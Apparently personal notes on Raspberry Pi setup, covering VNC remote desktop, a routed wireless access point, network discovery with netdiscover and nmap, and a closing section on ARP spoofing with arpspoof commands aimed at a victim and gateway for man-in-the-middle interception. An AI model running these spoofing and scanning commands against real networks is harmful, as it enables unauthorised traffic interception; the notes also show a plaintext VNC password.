# Raspberry Pi



### Setup Remote Desktop VNC

{% embed url="https://www.youtube.com/watch?v=nKnYLQplovI&list=PLYl5sY0sL98hJRpne6ShX1I9JJ6MVIH4q&index=4" %}

`sudo raspi-config`

Go to **Interface Option** then enable **VNC**

Go to **System Option** then **Boot/Auto Login** and then **Desktop Autologin**&#x20;

Then change a resolution go to **Display Options** then **VNC Resolution** and set up for example **1280x720**

Create password for VNC server:

`sudo vncpasswd -service`

password: sharberry

`sudo nano /etc/vnc/config.d/common.custom`

**Authentication=VncAuth**

Reboot the VNC server:

`sudo systemctl restart vncserver-x11-serviced`

In MacBook:

**cmd + k**&#x20;

`vnc://192.168.0.111`

## Setting up a Routed Wireless Access Point

{% embed url="https://www.raspberrypi.com/documentation/computers/configuration.html#setting-up-a-routed-wireless-access-point" %}

### Install AP and Management Software <a href="#software-install" id="software-install"></a>

In order to work as an access point, the Raspberry Pi needs to have the `hostapd` access point software package installed:

```
sudo apt install hostapd
```

Enable the wireless access point service and set it to start when your Raspberry Pi boots:

```
sudo systemctl unmask hostapd
sudo systemctl enable hostapd
```

In order to provide network management services (DNS, DHCP) to wireless clients, the Raspberry Pi needs to have the `dnsmasq` software package installed:

```
sudo apt install dnsmasq
```

Finally, install `netfilter-persistent` and its plugin `iptables-persistent`. This utility helps by saving firewall rules and restoring them when the Raspberry Pi boots:

```
sudo DEBIAN_FRONTEND=noninteractive apt install -y netfilter-persistent iptables-persistent
```

Software installation is complete. We will configure the software packages later on.

### Set up the Network Router

### Define the Wireless Interface IP Configuration

To configure the static IP address, edit the configuration file for `dhcpcd` with:

```
sudo nano /etc/dhcpcd.conf
```

Go to the end of the file and add the following:

```
interface wlan0
    static ip_address=192.168.4.1/24
    nohook wpa_supplicant
```

### Enable Routing and IP Masquerading

To enable routing, i.e. to allow traffic to flow from one network to the other in the Raspberry Pi, create a file using the following command, with the contents below:

```
sudo nano /etc/sysctl.d/routed-ap.conf
```

File contents:

```
# Enable IPv4 routing
net.ipv4.ip_forward=1
```

Enabling routing will allow hosts from network `192.168.4.0/24` to reach the LAN and the main router towards the internet.

This process is configured by adding a single firewall rule in the Raspberry Pi:

```
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

Now save the current firewall rules for IPv4 (including the rule above) and IPv6 to be loaded at boot by the `netfilter-persistent` service:

```
sudo netfilter-persistent save
```

Filtering rules are saved to the directory `/etc/iptables/`. If in the future you change the configuration of your firewall, make sure to save the configuration before rebooting.

### Configure the DHCP and DNS services for the wireless network

Rename the default configuration file and edit a new one:

```
sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
sudo nano /etc/dnsmasq.conf
```

Add the following to the file and save it:

```
interface=wlan0 # Listening interface
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
                # Pool of IP addresses served via DHCP
domain=wlan     # Local wireless DNS domain
address=/gw.wlan/192.168.4.1
                # Alias for this router
```

The Raspberry Pi will deliver IP addresses between `192.168.4.2` and `192.168.4.20`, with a lease time of 24 hours, to wireless DHCP clients. You should be able to reach the Raspberry Pi under the name `gw.wlan` from wireless clients.

### Ensure Wireless Operation

To ensure WiFi radio is not blocked on your Raspberry Pi, execute the following command:

```
sudo rfkill unblock wlan
```

This setting will be automatically restored at boot time. We will define an appropriate country code in the access point software configuration, next.

### Configure the AP Software

Create the `hostapd` configuration file, located at `/etc/hostapd/hostapd.conf`, to add the various parameters for your new wireless network.

```
sudo nano /etc/hostapd/hostapd.conf
```

Add the information below to the configuration file. This configuration assumes we are using channel 7, with a network name of `NameOfNetwork`, and a password `AardvarkBadgerHedgehog`. Note that the name and password should **not** have quotes around them. The passphrase should be between 8 and 64 characters in length.

```
country_code=GB
interface=wlan0
ssid=NameOfNetwork
hw_mode=g
channel=7
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=AardvarkBadgerHedgehog
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```

Note the line `country_code=GB`: it configures the computer to use the correct wireless frequencies in the United Kingdom. **Adapt this line** and specify the two-letter ISO code of your country. See [Wikipedia](https://en.wikipedia.org/wiki/ISO\_3166-1) for a list of two-letter ISO 3166-1 country codes.

To use the 5 GHz band, you can change the operations mode from `hw_mode=g` to `hw_mode=a`. Possible values for `hw_mode` are:

* a = IEEE 802.11a (5 GHz) (Raspberry Pi 3B+ onwards)
* b = IEEE 802.11b (2.4 GHz)
* g = IEEE 802.11g (2.4 GHz)

Note that when changing the `hw_mode`, you may need to also change the `channel` - see [Wikipedia](https://en.wikipedia.org/wiki/List\_of\_WLAN\_channels) for a list of allowed combinations.

Add also this:

```
sudo nano /etc/default/hostapd
```

Track this line:

```
DAEMON_CONF="/etc/hostapd/hostapd.conf"
```

### Running the new Wireless AP

Now restart your Raspberry Pi and verify that the wireless access point becomes automatically available.

```
sudo systemctl reboot
```

Once your Raspberry Pi has restarted, search for wireless networks with your wireless client. The network SSID you specified in file `/etc/hostapd/hostapd.conf` should now be present, and it should be accessible with the specified password.

If SSH is enabled on the Raspberry Pi, it should be possible to connect to it from your wireless client as follows, assuming the `pi` account is present: `ssh pi@192.168.4.1` or `ssh` [`pi@gw.wlan`](mailto:pi@gw.wlan)



For debuging:

```
sudo hostapd -dd /etc/hostapd/hostapd.conf > /tmp/hostapd.log 
```



## Netdiscover

```
netdiscover -r 192.168.1.0/24
```

Direct the result to a file and it refreshes the scan every 2 seconds:

```
netdiscover -r 192.168.1.0/24 -s 2 -P >> /tmp/file
```

Use nslookup to get hostname:

```
cat /tmp/file | grep '192\.' | grep -v Screen | cut -c1-14 | sort -u | nslookup | grep name | cut -f 2 | cut -c8-
```

Use nmap:

```
nmap `cat /tmp/file | grep '192\.' | grep -v Screen | cut -c2-34 | sort -u | awk '{ print $1 }' | tr '\n' ' '` 
```

## ARP Spoof

Before install mitmproxy install these:

```
apt-get install python-dev
apt-get install libxml2-dev
apt-get install libxslt-dev
pip install mitmproxy
```



Package is dsniff, and arpspoof must be run as super user so use `sudo -s`&#x20;

```
arpspoof -i eth0 -t <victim ip> <gateway ip>
arpspoof -i eth0 -t <gateway ip> <victim ip>
```

#### MiTM Attack

{% embed url="https://github.com/ReddyyZ/mitm.py" %}























